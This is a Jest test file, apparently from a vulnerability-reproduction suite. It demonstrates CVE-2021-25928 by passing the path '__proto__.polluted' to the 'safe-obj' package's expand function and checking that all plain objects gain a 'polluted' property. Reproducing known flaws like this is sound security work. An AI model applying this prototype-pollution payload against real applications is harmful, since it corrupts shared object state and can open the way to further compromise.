//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

test("prototype pollution in safeObj", () => {
  var safeObj = require("safe-obj");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeObj.expand(obj, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
